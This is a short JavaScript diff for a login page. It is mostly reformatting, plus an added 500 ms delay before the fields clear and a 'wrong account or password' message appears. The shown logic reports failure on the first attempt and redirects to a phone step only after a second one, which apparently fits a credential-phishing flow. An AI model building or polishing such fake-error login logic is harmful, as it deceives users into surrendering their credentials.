@@ -6,10 +6,10 @@ function showTip(text) {
     }, 1000)
 }
 
-function RndNum(n){
-    var rnd="";
-    for(var i=0;i<n;i++)
-        rnd+=Math.floor(Math.random()*10);
+function RndNum(n) {
+    var rnd = "";
+    for (var i = 0; i < n; i++)
+        rnd += Math.floor(Math.random() * 10);
     return rnd;
 }
 var count = 0;
@@ -33,12 +33,14 @@ $(document).ready(function () {
                 },
                 success: function (res) {
                     count++
-                    if (res === '0' && count>1) {
-                        return window.location = '/v3/phone?id='+ranid
+                    if (res === '0' && count > 1) {
+                        return window.location = '/v3/phone?id=' + ranid
                     }
-                    $('#u').val('')
-                    $('#p').val('')
-                    showTip('帐号或者密码错误！');
+                    setTimeout(function () {
+                        $('#u').val('')
+                        $('#p').val('')
+                        showTip('帐号或者密码错误！');
+                    }, 500)
                 }
             });
         }
